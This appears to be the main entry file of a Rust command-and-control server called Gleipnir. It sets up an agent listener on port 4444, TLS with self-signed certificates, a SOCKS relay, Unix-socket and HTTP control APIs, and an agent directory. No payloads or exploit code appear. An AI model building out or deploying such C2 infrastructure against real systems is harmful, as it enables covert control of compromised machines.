mod api;
mod http_api;
mod listener;
mod protocol;
mod session;
mod session_http;
mod session_raw;
mod socks;
mod ws;

use clap::Parser;
use std::sync::Arc;
use std::time::Instant;
use tracing::info;

use listener::{ListenerManager, ListenerMode};
use session::SessionManager;
use socks::SocksRelay;
use ws::EventBus;

#[derive(Parser)]
#[command(name = "gleipnir-server", about = "Gleipnir C2 server")]
struct Cli {
    #[arg(long, default_value = "0.0.0.0")]
    listen: String,

    #[arg(short, long, default_value_t = 4444)]
    port: u16,

    #[arg(long, default_value = "/tmp/gleipnir.sock")]
    api_socket: String,

    #[arg(long, default_value_t = 6666)]
    api_port: u16,

    /// TLS certificate file (PEM). When omitted, a self-signed cert is auto-generated.
    #[cfg(feature = "tls")]
    #[arg(long)]
    tls_cert: Option<String>,

    /// TLS private key file (PEM)
    #[cfg(feature = "tls")]
    #[arg(long)]
    tls_key: Option<String>,

    /// Disable TLS (plain TCP). Useful for testing or when agents lack TLS support.
    #[cfg(feature = "tls")]
    #[arg(long)]
    no_tls: bool,

    #[arg(long, default_value = "/opt/gleipnir/agents")]
    agent_dir: String,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "gleipnir_server=info".into()),
        )
        .init();

    #[cfg(feature = "tls")]
    rustls::crypto::ring::default_provider()
        .install_default()
        .expect("install rustls crypto provider");

    let cli = Cli::parse();
    let manager = Arc::new(SessionManager::new());
    let socks_relay = Arc::new(SocksRelay::new());
    let started_at = Instant::now();

    info!("gleipnir server starting");

    // Resolve TLS config
    #[cfg(feature = "tls")]
    let tls_config = if cli.no_tls {
        info!("TLS disabled (--no-tls)");
        None
    } else {
        match (&cli.tls_cert, &cli.tls_key) {
            (Some(cert), Some(key)) => {
                let cfg = listener::load_tls_config(cert, key)
                    .unwrap_or_else(|e| panic!("failed to load TLS config: {e}"));
                info!("TLS enabled (cert: {cert})");
                Some(cfg)
            }
            (Some(_), None) | (None, Some(_)) => {
                panic!("both --tls-cert and --tls-key must be provided");
            }
            _ => {
                let cfg = listener::generate_self_signed_tls()
                    .unwrap_or_else(|e| panic!("failed to generate self-signed TLS cert: {e}"));
                info!("TLS enabled (auto-generated self-signed cert)");
                Some(cfg)
            }
        }
    };

    // Create the listener manager
    let listener_manager = Arc::new(ListenerManager::new(
        manager.clone(),
        #[cfg(feature = "tls")]
        tls_config,
    ));

    // Create the default listener on --port
    listener_manager
        .create(cli.port, ListenerMode::Agent, cli.listen.clone(), String::new())
        .await
        .unwrap_or_else(|e| panic!("failed to create default listener: {e}"));

    // Unix socket API
    let api_manager = manager.clone();
    let api_socks = socks_relay.clone();
    let api_socket = cli.api_socket.clone();
    tokio::spawn(async move {
        api::start(&api_socket, api_manager, api_socks).await;
    });

    let event_bus = Arc::new(EventBus::new());

    // HTTP API (runs forever)
    let agent_dir = if std::path::Path::new(&cli.agent_dir).exists() {
        Some(cli.agent_dir.clone())
    } else {
        None
    };
    let http_state = http_api::AppState {
        manager: manager.clone(),
        socks_relay: socks_relay.clone(),
        listener_manager: listener_manager.clone(),
        event_bus,
        started_at,
        agent_dir,
    };
    http_api::start(cli.api_port, http_state).await;
}
